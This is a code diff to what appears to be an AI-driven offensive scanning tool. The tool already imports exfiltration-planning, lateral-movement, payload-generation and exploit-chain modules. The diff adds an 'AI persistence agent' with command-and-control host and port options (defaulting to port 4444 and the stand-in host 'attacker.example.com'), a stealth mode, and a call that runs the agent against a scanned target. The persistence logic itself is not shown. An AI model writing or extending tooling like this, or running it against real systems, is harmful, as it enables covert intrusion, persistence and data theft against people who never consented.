@@ -36,6 +36,7 @@ from utils.ai_session_manager import run_session_manager, SessionCommand
 from utils.ai_decision_engine import run_decision_engine
 from utils.ai_exfil_planner import run_exfil_planner
 from utils.ai_lateral_mover import run_lateral_mover
+from utils.ai_persistence_agent import run_persistence_agent
 from modules.AI_osint_correlator import AIOSINTCorrelator
 from modules.AI_payload_generator import AIPayloadGenerator
 from core.exploit_chain import ExploitChain
@@ -114,6 +115,10 @@ def start_scan():
         'lateral_move': False,
         'lateral_fast_mode': False,
         'lateral_delay': 0.15,
+        'persistence': False,
+        'c2_host': '',
+        'c2_port': 4444,
+        'persistence_stealth': True,
         'orchestrator_mode': 'full_recon',
         'intensity': 'normal'
     })
@@ -552,6 +557,19 @@ def run_scan(scan_id, domain, options):
                     )
                 except Exception as e:
                     scan_results[scan_id]['lateral_move'] = {'error': str(e)}
+                    
+            if options.get('persistence') and options.get('c2_host'):
+                scan_status[scan_id]['current_task'] = 'AI Persistence Planning...'
+                try:
+                    scan_results[scan_id]['persistence'] = run_persistence_agent(
+                        target_url=target_base_url,
+                        scan_results=scan_results[scan_id],
+                        c2_host=options.get('c2_host', 'attacker.example.com'),
+                        c2_port=int(options.get('c2_port', 4444)),
+                        stealth_mode=options.get('persistence_stealth', True),
+                    )
+                except Exception as e:
+                    scan_results[scan_id]['persistence'] = {'error': str(e)}
                     
             if options.get('exfil_plan'):
                 scan_status[scan_id]['current_task'] = 'AI Exfil Planning...'
